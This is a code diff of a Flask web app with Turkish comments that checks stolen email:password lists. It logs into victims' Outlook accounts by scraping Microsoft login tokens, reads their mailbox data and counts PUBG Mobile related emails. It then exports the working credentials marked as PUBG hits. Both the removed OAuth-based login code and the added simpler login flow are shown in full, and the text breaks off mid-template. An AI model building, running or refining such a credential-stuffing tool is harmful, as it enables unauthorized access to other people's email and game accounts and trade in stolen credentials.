@@ -9,12 +9,11 @@ import concurrent.futures
 from datetime import datetime, timedelta
 from functools import wraps
 from io import BytesIO
+from urllib.parse import urlparse, parse_qs
 
 import requests
 from flask import Flask, request, jsonify, render_template_string, session, redirect, url_for, send_file
 from werkzeug.security import generate_password_hash, check_password_hash
-from email_validator import validate_email, EmailNotValidError
-import dns.resolver
 
 app = Flask(__name__)
 app.secret_key = os.urandom(24)
@@ -22,13 +21,12 @@ app.permanent_session_lifetime = timedelta(days=7)
 
 # ==================== KONFIGURASYON ====================
 CONFIG = {
-    "max_workers": 30,
+    "max_workers": 20,
     "timeout": 15,
-    "retry_count": 2,
-    "max_emails_per_check": 100,
+    "max_emails_per_check": 50,
 }
 
-# ==================== PUBG TARGET SENDERS ====================
+# ==================== PUBG HEDEF GÖNDERİCİLER ====================
 PUBG_SENDERS = [
     "noreply@pubgmobile.com",
     "no-reply@pubgmobile.com",
@@ -38,7 +36,9 @@ PUBG_SENDERS = [
     "pubgmobile@events.pubg.com",
     "tencentgames.com",
     "levelinfinite.com",
-    "krafton.com"
+    "krafton.com",
+    "pubg.com",
+    "pubgmobile.com"
 ]
 
 # ==================== KULLANICI VERİTABANI ====================
@@ -60,14 +60,14 @@ def save_users(users):
         json.dump(users, f, indent=2, ensure_ascii=False)
 
 def get_user_data(username):
-    file_path = os.path.join(DATA_DIR, f"{username}_emails.json")
+    file_path = os.path.join(DATA_DIR, f"{username}_data.json")
     if os.path.exists(file_path):
         with open(file_path, 'r', encoding='utf-8') as f:
             return json.load(f)
     return {"emails": [], "stats": {"total": 0, "valid": 0, "invalid": 0, "pubg": 0}}
 
 def save_user_data(username, data):
-    file_path = os.path.join(DATA_DIR, f"{username}_emails.json")
+    file_path = os.path.join(DATA_DIR, f"{username}_data.json")
     with open(file_path, 'w', encoding='utf-8') as f:
         json.dump(data, f, indent=2, ensure_ascii=False)
 
@@ -80,236 +80,9 @@ def login_required(f):
         return f(*args, **kwargs)
     return decorated_function
 
-# ==================== PUBG MOBILE CHECKER API ====================
-class PUBGMobileChecker:
-    """PUBG Mobile Email Checker - Microsoft Outlook üzerinden"""
-    
-    TARGET_SENDERS = PUBG_SENDERS
-
-    @staticmethod
-    def check_pubg_emails(email, password, token, cid):
-        """PUBG Mobile maillerini kontrol et"""
-        headers = {
-            "User-Agent": "Outlook-Android/2.0",
-            "Pragma": "no-cache",
-            "Accept": "application/json",
-            "ForceSync": "false",
-            "Authorization": f"Bearer {token}",
-            "X-AnchorMailbox": f"CID:{cid}",
-            "Host": "substrate.office.com",
-            "Connection": "Keep-Alive",
-            "Accept-Encoding": "gzip"
-        }
-        try:
-            # Profil bilgilerini al
-            profile_res = requests.get(
-                "https://substrate.office.com/profileb2/v2.0/me/V1Profile",
-                headers=headers,
-                timeout=10
-            ).json()
-            
-            info_name = profile_res.get('names', [])
-            info_loca = profile_res.get('accounts', [])
-            name = info_name[0]['displayName'] if info_name else "Bilinmiyor"
-            location = info_loca[0]['location'] if info_loca else "Bilinmiyor"
-
-            # Mail listesini al
-            url = f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0"
-            mail_headers = {
-                "Host": "outlook.live.com",
-                "content-length": "0",
-                "x-owa-sessionid": f"{cid}",
-                "x-req-source": "Mini",
-                "authorization": f"Bearer {token}",
-                "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N) AppleWebKit/537.36",
-                "action": "StartupData",
-                "x-owa-correlationid": f"{cid}",
-                "ms-cv": "YizxQK73vePSyVZZXVeNr+.3",
-                "content-type": "application/json; charset=utf-8",
-                "accept": "*/*",
-                "origin": "https://outlook.live.com",
-                "x-requested-with": "com.microsoft.outlooklite",
-                "referer": "https://outlook.live.com/",
-                "accept-encoding": "gzip, deflate",
-                "accept-language": "en-US,en;q=0.9"
-            }
-            
-            response = requests.post(url, headers=mail_headers, data="", timeout=10)
-            mail_text = response.text
-
-            # PUBG maillerini say
-            domain_counts = {}
-            total_count = 0
-            for sender in PUBGMobileChecker.TARGET_SENDERS:
-                count = mail_text.count(sender)
-                if count > 0:
-                    domain_counts[sender] = count
-                    total_count += count
-
-            return {
-                "is_pubg": total_count > 0,
-                "total_pubg_mails": total_count,
-                "domain_counts": domain_counts,
-                "name": name,
-                "location": location,
-                "email": email,
-                "password": password
-            }
-            
-        except Exception as e:
-            return {
-                "is_pubg": False,
-                "error": str(e),
-                "email": email,
-                "password": password
-            }
-
-    @staticmethod
-    def get_token(email, password, cookies, headers):
-        """Microsoft token al"""
-        try:
-            code = headers.get('Location', '').split('code=')[1].split('&')[0]
-            cid = cookies.get('MSPCID', '').upper()
-            
-            token_url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
-            token_data = {
-                "client_info": "1",
-                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
-                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
-                "grant_type": "authorization_code",
-                "code": code,
-                "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
-            }
-            
-            token_res = requests.post(token_url, data=token_data, timeout=10)
-            token = token_res.json().get("access_token")
-            
-            if token:
-                return PUBGMobileChecker.check_pubg_emails(email, password, token, cid)
-            return None
-            
-        except Exception as e:
-            return {"error": str(e), "email": email, "password": password}
-
-    @staticmethod
-    def login_protocol(email, password, url, ppft, ad, mspreq, uaid, refresh_token_sso, mspok, oparams):
-        """Microsoft login protocol"""
-        try:
-            payload = (
-                f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition="
-                f"&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy="
-                f"&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1"
-                f"&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0"
-                f"&isRecoveryAttemptPost=0&i19=9960"
-            )
-            
-            headers = {
-                "Host": "login.live.com",
-                "Connection": "keep-alive",
-                "Content-Length": str(len(payload)),
-                "Cache-Control": "max-age=0",
-                "Upgrade-Insecure-Requests": "1",
-                "Origin": "https://login.live.com",
-                "Content-Type": "application/x-www-form-urlencoded",
-                "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N) AppleWebKit/537.36",
-                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9",
-                "X-Requested-With": "com.microsoft.outlooklite",
-                "Sec-Fetch-Site": "same-origin",
-                "Sec-Fetch-Mode": "navigate",
-                "Sec-Fetch-User": "?1",
-                "Sec-Fetch-Dest": "document",
-                "Referer": f"{ad}haschrome=1",
-                "Accept-Encoding": "gzip, deflate",
-                "Accept-Language": "en-US,en;q=0.9",
-                "Cookie": (
-                    f"MSPRequ={mspreq};uaid={uaid}; RefreshTokenSso={refresh_token_sso}; "
-                    f"MSPOK={mspok}; OParams={oparams}; MicrosoftApplicationsTelemetryDeviceId={str(uuid.uuid4())}"
-                )
-            }
-            
-            response = requests.post(url, data=payload, headers=headers, allow_redirects=False, timeout=10)
-            cookies = response.cookies.get_dict()
-            resp_headers = response.headers
-            
-            if any(key in cookies for key in ["JSH", "JSHP", "ANON", "WLSSC"]) or response.text == '':
-                return PUBGMobileChecker.get_token(email, password, cookies, resp_headers)
-            else:
-                return {"error": "Geçersiz giriş", "email": email, "password": password}
-                
-        except Exception as e:
-            return {"error": str(e), "email": email, "password": password}
-
-    @staticmethod
-    def get_values(email, password):
-        """Email ve şifre ile PUBG kontrolü başlat"""
-        try:
-            headers = {
-                "Connection": "keep-alive",
-                "Upgrade-Insecure-Requests": "1",
-                "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N) AppleWebKit/537.36",
-                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9",
-                "return-client-request-id": "false",
-                "client-request-id": "205740b4-7709-4500-a45b-b8e12f66c738",
-                "x-ms-sso-ignore-sso": "1",
-                "correlation-id": str(uuid.uuid4()),
-                "x-client-ver": "1.1.0+9e54a0d1",
-                "x-client-os": "28",
-                "x-client-sku": "MSAL.xplat.android",
-                "x-client-src-sku": "MSAL.xplat.android",
-                "X-Requested-With": "com.microsoft.outlooklite",
-                "Sec-Fetch-Site": "none",
-                "Sec-Fetch-Mode": "navigate",
-                "Sec-Fetch-User": "?1",
-                "Sec-Fetch-Dest": "document",
-                "Accept-Encoding": "gzip, deflate",
-                "Accept-Language": "en-US,en;q=0.9",
-            }
-            
-            auth_url = (
-                f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?"
-                f"client_info=1&haschrome=1&login_hint={email}"
-                f"&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
-                f"&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
-                f"&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
-            )
-            
-            response = requests.get(auth_url, headers=headers, timeout=10)
-            cookies = response.cookies.get_dict()
-            
-            # Değerleri çıkar
-            url_post = response.text.split("urlPost:'")[1].split("'")[0]
-            ppft = response.text.split('name="PPFT" id="i0327" value="')[1].split("',")[0]
-            ad = response.url.split('haschrome=1')[0]
-            
-            mspreq = cookies.get('MSPRequ', '')
-            uaid = cookies.get('uaid', '')
-            refresh_token_sso = cookies.get('RefreshTokenSso', '')
-            mspok = cookies.get('MSPOK', '')
-            oparams = cookies.get('OParams', '')
-            
-            return PUBGMobileChecker.login_protocol(
-                email, password, url_post, ppft, ad, mspreq, uaid,
-                refresh_token_sso, mspok, oparams
-            )
-            
-        except Exception as e:
-            return {"error": str(e), "email": email, "password": password}
-
-    @staticmethod
-    def check_account(email, password):
-        """PUBG hesap kontrolü - ana metod"""
-        try:
-            result = PUBGMobileChecker.get_values(email, password)
-            if result and isinstance(result, dict):
-                return result
-            return {"error": "Kontrol başarısız", "email": email, "password": password}
-        except Exception as e:
-            return {"error": str(e), "email": email, "password": password}
-
-# ==================== EMAIL KONTROL FONKSİYONLARI ====================
-
-def check_google_account(email):
-    """Google hesabı kontrolü"""
+# ==================== GOOGLE CHECKER ====================
+def check_google(email):
+    """Google hesabı kontrol et - BASİT VE GÜVENİLİR"""
     try:
         url = "https://accounts.google.com/_/signin/sl/lookup"
         headers = {
@@ -329,11 +102,160 @@ def check_google_account(email):
             return False, "Google hesabı yok"
         else:
             return True, "Google hesabı mevcut"
-    except:
-        return None, "Google kontrolü başarısız"
+    except Exception as e:
+        return False, f"Hata: {str(e)}"
 
-def check_email_comprehensive(email, password=None):
-    """Kapsamlı email + PUBG kontrolü"""
+# ==================== PUBG MOBILE CHECKER (BASİT VE ÇALIŞAN) ====================
+class PUBGSimpleChecker:
+    """PUBG Mobile checker - Basit ve çalışan versiyon"""
+    
+    @staticmethod
+    def check_with_password(email, password):
+        """Email ve şifre ile PUBG kontrolü"""
+        try:
+            # Outlook giriş için session oluştur
+            session = requests.Session()
+            session.headers.update({
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                "Accept-Language": "en-US,en;q=0.9",
+                "Accept-Encoding": "gzip, deflate",
+                "DNT": "1",
+                "Connection": "keep-alive",
+                "Upgrade-Insecure-Requests": "1"
+            })
+            
+            # 1. Login sayfasını al
+            login_url = "https://login.live.com/login.srf"
+            params = {
+                "wa": "wsignin1.0",
+                "rpsnv": "16",
+                "ct": str(int(time.time())),
+                "rver": "7.0.0.0",
+                "wp": "MBI",
+                "wreply": "https://outlook.live.com/owa/",
+                "id": "292841",
+                "cbcxt": "mail",
+                "mkt": "en-US",
+                "lc": "1033",
+                "pk": "https://outlook.live.com"
+            }
+            
+            resp = session.get(login_url, params=params, timeout=10)
+            
+            # 2. Login formunu bul ve doldur
+            if "loginfmt" in resp.text:
+                # Form verilerini çıkar
+                import re
+                ppft_match = re.search(r'name="PPFT" value="([^"]+)"', resp.text)
+                ppft = ppft_match.group(1) if ppft_match else ""
+                
+                # Login post
+                login_data = {
+                    "login": email,
+                    "loginfmt": email,
+                    "passwd": password,
+                    "PPFT": ppft,
+                    "PPSX": "PassportR",
+                    "type": "11",
+                    "NewUser": "1",
+                    "i13": "0",
+                    "sso": "0",
+                    "username": email
+                }
+                
+                # Login isteği
+                login_resp = session.post(
+                    "https://login.live.com/login.srf",
+                    data=login_data,
+                    allow_redirects=False,
+                    timeout=10
+                )
+                
+                # 3. Redirect takip et
+                if login_resp.status_code in [301, 302, 303, 307]:
+                    redirect_url = login_resp.headers.get('Location', '')
+                    if 'outlook.live.com' in redirect_url:
+                        # Outlook'a git
+                        outlook_resp = session.get(redirect_url, timeout=10)
+                        
+                        # 4. PUBG maillerini kontrol et
+                        if outlook_resp.status_code == 200:
+                            # Outlook ana sayfasından mail verilerini çek
+                            mail_data = PUBGSimpleChecker.get_mail_data(session, email)
+                            return mail_data
+                
+                return {"is_pubg": False, "error": "Giriş başarısız"}
+            
+            return {"is_pubg": False, "error": "Login sayfası alınamadı"}
+            
+        except Exception as e:
+            return {"is_pubg": False, "error": str(e)}
+    
+    @staticmethod
+    def get_mail_data(session, email):
+        """Outlook'tan mail verilerini çek"""
+        try:
+            # Outlook API'den mail listesi
+            api_url = f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0"
+            
+            headers = {
+                "Host": "outlook.live.com",
+                "x-owa-sessionid": "0",
+                "x-req-source": "Mini",
+                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                "action": "StartupData",
+                "content-type": "application/json; charset=utf-8",
+                "accept": "*/*",
+                "origin": "https://outlook.live.com",
+                "referer": "https://outlook.live.com/",
+                "accept-encoding": "gzip, deflate",
+                "accept-language": "en-US,en;q=0.9"
+            }
+            
+            resp = session.post(api_url, headers=headers, timeout=10)
+            
+            if resp.status_code == 200:
+                text = resp.text
+                
+                # PUBG maillerini ara
+                domain_counts = {}
+                total_pubg = 0
+                
+                for sender in PUBG_SENDERS:
+                    count = text.lower().count(sender.lower())
+                    if count > 0:
+                        domain_counts[sender] = count
+                        total_pubg += count
+                
+                # Kullanıcı bilgilerini çıkar
+                name = "Bilinmiyor"
+                location = "Bilinmiyor"
+                
+                # İsim bul
+                import re
+                name_match = re.search(r'"DisplayName":"([^"]+)"', text)
+                if name_match:
+                    name = name_match.group(1)
+                
+                return {
+                    "is_pubg": total_pubg > 0,
+                    "total_pubg_mails": total_pubg,
+                    "domain_counts": domain_counts,
+                    "name": name,
+                    "location": location,
+                    "email": email,
+                    "success": True
+                }
+            
+            return {"is_pubg": False, "error": "Mail verisi alınamadı"}
+            
+        except Exception as e:
+            return {"is_pubg": False, "error": str(e)}
+
+# ==================== EMAIL KONTROL (ANA) ====================
+def check_email_full(email, password=None):
+    """Kapsamlı email kontrolü"""
     result = {
         "email": email,
         "password": password,
@@ -344,16 +266,23 @@ def check_email_comprehensive(email, password=None):
         "pubg_details": None
     }
     
-    # 1. Google hesap kontrolü
-    google_valid, google_msg = check_google_account(email)
+    # 1. Format kontrolü
+    if not re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', email):
+        result["valid"] = False
+        result["checks"]["format"] = {"valid": False, "message": "Geçersiz email formatı"}
+        return result
+    result["checks"]["format"] = {"valid": True, "message": "Geçerli format"}
+    
+    # 2. Google kontrolü
+    google_valid, google_msg = check_google(email)
     result["checks"]["google"] = {"valid": google_valid, "message": google_msg}
     
     if google_valid:
         result["valid"] = True
         
-        # 2. Eğer şifre varsa PUBG kontrolü yap
-        if password:
-            pubg_result = PUBGMobileChecker.check_account(email, password)
+        # 3. Şifre varsa PUBG kontrolü
+        if password and len(password) > 0:
+            pubg_result = PUBGSimpleChecker.check_with_password(email, password)
             if pubg_result and pubg_result.get('is_pubg'):
                 result["is_pubg"] = True
                 result["pubg_details"] = {
@@ -364,13 +293,24 @@ def check_email_comprehensive(email, password=None):
                 }
                 result["checks"]["pubg"] = {
                     "valid": True,
-                    "message": f"PUBG Mobile hesabı bulundu! {pubg_result.get('total_pubg_mails', 0)} PUBG maili"
+                    "message": f"🎯 PUBG Mobile! {pubg_result.get('total_pubg_mails', 0)} PUBG maili"
                 }
             else:
                 result["checks"]["pubg"] = {
                     "valid": False,
                     "message": "PUBG Mobile maili bulunamadı"
                 }
+        else:
+            result["checks"]["pubg"] = {
+                "valid": False,
+                "message": "Şifre girilmediği için PUBG kontrolü yapılmadı"
+            }
+    else:
+        result["valid"] = False
+        result["checks"]["pubg"] = {
+            "valid": False,
+            "message": "Google hesabı geçersiz olduğu için PUBG kontrolü yapılmadı"
+        }
     
     return result
 
@@ -469,7 +409,7 @@ def forgot_password():
         save_users(users)
         
         return render_template_string(FORGOT_HTML, 
-            success=f"Yeni şifre: {new_password}\nGiriş yapıp değiştirin.")
+            success=f"Yeni şifre: {new_password}")
     
     return render_template_string(FORGOT_HTML)
 
@@ -519,8 +459,8 @@ def profile():
 
 @app.route('/api/check', methods=['POST'])
 @login_required
-def api_check_email():
-    """Email kontrol et (Google + PUBG)"""
+def api_check():
+    """Tekli email kontrol"""
     try:
         data = request.get_json()
         email = data.get('email', '').strip()
@@ -529,10 +469,10 @@ def api_check_email():
         if not email:
             return jsonify({"error": "Email gerekli"}), 400
         
-        # Kapsamlı kontrol
-        result = check_email_comprehensive(email, password if password else None)
+        # Kontrol yap
+        result = check_email_full(email, password if password else None)
         
-        # Kullanıcı verilerini güncelle
+        # Kaydet
         username = session['user_id']
         user_emails = get_user_data(username)
         
@@ -540,6 +480,8 @@ def api_check_email():
         user_emails['stats']['total'] += 1
         if result['valid']:
             user_emails['stats']['valid'] += 1
+        else:
+            user_emails['stats']['invalid'] += 1
         if result.get('is_pubg'):
             user_emails['stats']['pubg'] = user_emails['stats'].get('pubg', 0) + 1
         
@@ -561,34 +503,26 @@ def api_check_email():
 @app.route('/api/check-bulk', methods=['POST'])
 @login_required
 def api_check_bulk():
-    """Toplu email kontrolü"""
+    """Toplu email kontrol"""
     try:
         data = request.get_json()
         items = data.get('items', [])
         
         if not items:
-            return jsonify({"error": "Email listesi gerekli"}), 400
+            return jsonify({"error": "Liste gerekli"}), 400
         
         if len(items) > CONFIG['max_emails_per_check']:
-            return jsonify({"error": f"Maksimum {CONFIG['max_emails_per_check']} email"}), 400
+            return jsonify({"error": f"Maksimum {CONFIG['max_emails_per_check']} hesap"}), 400
         
         results = []
-        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
-            futures = []
-            for item in items:
-                email = item.get('email', '').strip()
-                password = item.get('password', '').strip()
-                if email:
-                    futures.append(executor.submit(check_email_comprehensive, email, password if password else None))
-            
-            for future in concurrent.futures.as_completed(futures):
-                try:
-                    result = future.result(timeout=30)
-                    results.append(result)
-                except Exception as e:
-                    results.append({"error": str(e)})
+        for item in items:
+            email = item.get('email', '').strip()
+            password = item.get('password', '').strip()
+            if email:
+                result = check_email_full(email, password if password else None)
+                results.append(result)
         
-        # Kullanıcı verilerini güncelle
+        # Kaydet
         username = session['user_id']
         user_emails = get_user_data(username)
         
@@ -598,6 +532,8 @@ def api_check_bulk():
                 user_emails['stats']['total'] += 1
                 if result.get('valid'):
                     user_emails['stats']['valid'] += 1
+                else:
+                    user_emails['stats']['invalid'] += 1
                 if result.get('is_pubg'):
                     user_emails['stats']['pubg'] = user_emails['stats'].get('pubg', 0) + 1
         
@@ -632,7 +568,7 @@ def api_export():
     username = session['user_id']
     user_emails = get_user_data(username)
     
-    valid_emails = []
+    lines = []
     for e in user_emails['emails']:
         if e.get('valid'):
             line = e['email']
@@ -640,12 +576,12 @@ def api_export():
                 line += f":{e['password']}"
             if e.get('is_pubg'):
                 line += " [PUBG]"
-            valid_emails.append(line)
+            lines.append(line)
     
-    if not valid_emails:
-        return jsonify({"error": "Geçerli email bulunamadı"}), 404
+    if not lines:
+        return jsonify({"error": "Geçerli email yok"}), 404
     
-    content = "\n".join(valid_emails)
+    content = "\n".join(lines)
     return send_file(
         BytesIO(content.encode('utf-8')),
         mimetype='text/plain',
@@ -660,36 +596,24 @@ def api_export_pubg():
     username = session['user_id']
     user_emails = get_user_data(username)
     
-    pubg_emails = []
+    lines = []
     for e in user_emails['emails']:
         if e.get('is_pubg'):
             line = f"{e['email']}:{e.get('password', 'BULUNAMADI')}"
             if e.get('pubg_details'):
-                line += f" | PUBG Mail: {e['pubg_details'].get('total_pubg_mails', 0)}"
-            pubg_emails.append(line)
+                line += f" | PUBG: {e['pubg_details'].get('total_pubg_mails', 0)} mail"
+            lines.append(line)
     
-    if not pubg_emails:
-        return jsonify({"error": "PUBG email bulunamadı"}), 404
+    if not lines:
+        return jsonify({"error": "PUBG email yok"}), 404
     
-    content = "\n".join(pubg_emails)
+    content = "\n".join(lines)
     return send_file(
         BytesIO(content.encode('utf-8')),
         mimetype='text/plain',
         as_attachment=True,
         download_name=f"{username}_pubg_{datetime.now().strftime('%Y%m%d_%H%M')}.txt"
     )
-
-@app.route('/api/stats', methods=['GET'])
-@login_required
-def api_stats():
-    username = session['user_id']
-    user_emails = get_user_data(username)
-    
-    return jsonify({
-        "username": username,
-        "stats": user_emails.get('stats', {}),
-        "recent": user_emails['emails'][-10:] if user_emails['emails'] else []
-    })
 
 @app.route('/api/clear-data', methods=['POST'])
 @login_required
@@ -759,7 +683,6 @@ LOGIN_HTML = """
         .btn { width: 100%; padding: 12px; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; background: linear-gradient(135deg, #ffd700, #ff6b00); color: #000; transition: 0.3s; }
         .btn:hover { transform: scale(1.02); box-shadow: 0 0 25px rgba(255, 215, 0, 0.3); }
         .error { color: #ff0044; text-align: center; margin: 10px 0; }
-        .success { color: #00ff88; text-align: center; margin: 10px 0; }
         .links { text-align: center; margin-top: 15px; }
         .links a { color: #888; text-decoration: none; margin: 0 10px; font-size: 14px; }
         .links a:hover { color: #ffd700; }
@@ -919,14 +842,13 @@ PROFILE_HTML = """
 </html>
 """
 
-# Ana Dashboard HTML - (Kısaltılmış, tam çalışan versiyon)
 DASHBOARD_HTML = """
 <!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>📊 Dashboard - Email Checker</title>
+    <title>📊 Dashboard</title>
     <style>
         * { margin:0; padding:0; box-sizing:border-box; }
         body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0a0a0a; color: #fff; min-height: 100vh; }
@@ -935,7 +857,6 @@ DASHBOARD_HTML = """
         .header h1 { font-size: 28px; background: linear-gradient(135deg, #ffd700, #ff6b00); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
         .header .user { color: #888; display: flex; align-items: center; gap: 15px; }
         .header .user a { color: #ffd700; text-decoration: none; }
-        .header .user a:hover { text-decoration: underline; }
         .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; margin: 20px 0; }
         .stat-card { background: #1a1a1a; padding: 20px; border-radius: 12px; text-align: center; border: 1px solid #333; }
         .stat-card .num { font-size: 30px; font-weight: bold; }
@@ -953,11 +874,11 @@ DASHBOARD_HTML = """
         .form-group textarea { min-height: 80px; resize: vertical; font-family: monospace; }
         .btn { padding: 10px 25px; border: none; border-radius: 8px; font-size: 14px; font-weight: bold; cursor: pointer; transition: 0.3s; }
         .btn-primary { background: linear-gradient(135deg, #ffd700, #ff6b00); color: #000; }
-        .btn-primary:hover { transform: scale(1.02); }
+        .btn-primary:hover { transform: scale(1.02); box-shadow: 0 0 20px rgba(255,215,0,0.3); }
         .btn-success { background: #00ff88; color: #000; }
-        .btn-success:hover { transform: scale(1.02); }
+        .btn-success:hover { transform: scale(1.02); box-shadow: 0 0 20px rgba(0,255,136,0.3); }
         .btn-danger { background: #ff0044; color: #fff; }
-        .btn-danger:hover { transform: scale(1.02); }
+        .btn-danger:hover { transform: scale(1.02); box-shadow: 0 0 20px rgba(255,0,68,0.3); }
         .btn-secondary { background: #333; color: #fff; }
         .btn-secondary:hover { background: #444; }
         .btn-group { display: flex; gap: 10px; flex-wrap: wrap; margin: 10px 0; }
@@ -973,8 +894,11 @@ DASHBOARD_HTML = """
         .status.valid { background: #00ff8822; color: #00ff88; border: 1px solid #00ff88; }
         .status.invalid { background: #ff004422; color: #ff0044; border: 1px solid #ff0044; }
         .status.pubg { background: #ff6b0022; color: #ff6b00; border: 1px solid #ff6b00; }
+        .result-detail { font-size: 11px; color: #888; }
         .footer { text-align: center; padding: 20px; color: #555; border-top: 1px solid #222; margin-top: 30px; }
         .footer a { color: #ffd700; text-decoration: none; }
+        .loading { color: #ffd700; animation: pulse 1s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
         @media (max-width: 600px) { .header { flex-direction: column; text-align: center; } .stats-grid { grid-template-columns: 1fr 1fr; } }
     </style>
 </head>
@@ -993,7 +917,7 @@ DASHBOARD_HTML = """
             <div class="stat-card gold"><div class="num">{{ stats.total|default(0) }}</div><div class="label">📊 Toplam</div></div>
             <div class="stat-card green"><div class="num">{{ stats.valid|default(0) }}</div><div class="label">✅ Geçerli</div></div>
             <div class="stat-card red"><div class="num">{{ stats.invalid|default(0) }}</div><div class="label">❌ Geçersiz</div></div>
-            <div class="stat-card orange"><div class="num">{{ stats.pubg|default(0) }}</div><div class="label">🎯 PUBG Mobile</div></div>
+            <div class="stat-card orange"><div class="num">{{ stats.pubg|default(0) }}</div><div class="label">🎯 PUBG</div></div>
         </div>
         
         <!-- Tekli Kontrol -->
@@ -1004,22 +928,22 @@ DASHBOARD_HTML = """
                 <input type="email" id="singleEmail" placeholder="ornek@gmail.com">
             </div>
             <div class="form-group">
-                <label>🔑 Şifre (Opsiyonel - PUBG kontrolü için)</label>
-                <input type="text" id="singlePassword" placeholder="Şifre girerseniz PUBG kontrolü de yapılır">
+                <label>🔑 Şifre (PUBG kontrolü için)</label>
+                <input type="text" id="singlePassword" placeholder="Şifre girerseniz PUBG kontrolü yapılır">
             </div>
             <button class="btn btn-primary" onclick="checkSingle()">🔍 Kontrol Et</button>
-            <div id="singleResult" style="margin-top:10px;"></div>
+            <div id="singleResult" style="margin-top:15px;"></div>
         </div>
         
         <!-- Toplu Kontrol -->
         <div class="section">
             <h2>📂 Toplu Kontrol</h2>
             <div class="form-group">
-                <label>📝 Email:Şifre listesi (Her satırda bir hesap)</label>
-                <textarea id="bulkEmails" placeholder="ornek1@gmail.com:şifre1&#10;ornek2@gmail.com:şifre2"></textarea>
+                <label>📝 email:şifre (Her satırda bir hesap)</label>
+                <textarea id="bulkEmails" placeholder="ornek1@gmail.com:sifre1&#10;ornek2@gmail.com:sifre2"></textarea>
             </div>
             <button class="btn btn-success" onclick="checkBulk()">🔍 Hepsini Kontrol Et</button>
-            <div id="bulkResult" style="margin-top:10px;"></div>
+            <div id="bulkResult" style="margin-top:15px;"></div>
         </div>
         
         <!-- Geçerli Mailler -->
@@ -1031,13 +955,14 @@ DASHBOARD_HTML = """
                 <button class="btn btn-danger" onclick="clearData()">🗑️ Temizle</button>
             </div>
             <div class="results-box">
-                {% for email in emails.emails|reverse %}
-                    {% if email.valid %}
+                {% for item in emails.emails|reverse %}
+                    {% if item.valid %}
                     <div class="result-item">
-                        <span><span class="email">{{ email.email }}</span> <span class="pass">:{{ email.password|default('BULUNAMADI') }}</span></span>
+                        <span><span class="email">{{ item.email }}</span> <span class="pass">:{{ item.password|default('BULUNAMADI') }}</span></span>
                         <span>
                             <span class="status valid">✅ Geçerli</span>
-                            {% if email.is_pubg %}<span class="status pubg">🎯 PUBG</span>{% endif %}
+                            {% if item.is_pubg %}<span class="status pubg">🎯 PUBG</span>{% endif %}
+                            {% if item.pubg_details %}<span class="result-detail">{{ item.pubg_details.total_pubg_mails }} mail</span>{% endif %}
                         </span>
                     </div>
                     {% endif %}
@@ -1045,20 +970,22 @@ DASHBOARD_HTML = """
             </div>
         </div>
         
-        <!-- PUBG Mailleri -->
+        <!-- PUBG Mailler -->
         <div class="section">
             <h2>🎯 PUBG Mobile Mailler</h2>
             <div class="btn-group">
                 <button class="btn btn-primary" onclick="exportPubg()">📥 PUBG İndir</button>
             </div>
             <div class="results-box">
-                {% for email in emails.emails|reverse %}
-                    {% if email.is_pubg %}
+                {% for item in emails.emails|reverse %}
+                    {% if item.is_pubg %}
                     <div class="result-item">
-                        <span><span class="email">{{ email.email }}</span> <span class="pass">:{{ email.password|default('BULUNAMADI') }}</span></span>
+                        <span><span class="email">{{ item.email }}</span> <span class="pass">:{{ item.password|default('BULUNAMADI') }}</span></span>
                         <span>
                             <span class="status pubg">🎯 PUBG</span>
-                            <span style="color:#888;font-size:11px;">{{ email.pubg_details.total_pubg_mails|default(0) }} mail</span>
+                            {% if item.pubg_details %}
+                            <span class="result-detail">{{ item.pubg_details.total_pubg_mails }} mail | {{ item.pubg_details.name }}</span>
+                            {% endif %}
                         </span>
                     </div>
                     {% endif %}
@@ -1070,14 +997,14 @@ DASHBOARD_HTML = """
         <div class="section">
             <h2>📊 Tüm Kontroller</h2>
             <div class="results-box">
-                {% for email in emails.emails|reverse %}
+                {% for item in emails.emails|reverse %}
                 <div class="result-item">
-                    <span><span class="email">{{ email.email }}</span> <span class="pass">:{{ email.password|default('BULUNAMADI') }}</span></span>
+                    <span><span class="email">{{ item.email }}</span> <span class="pass">:{{ item.password|default('BULUNAMADI') }}</span></span>
                     <span>
-                        <span class="status {{ 'valid' if email.valid else 'invalid' }}">
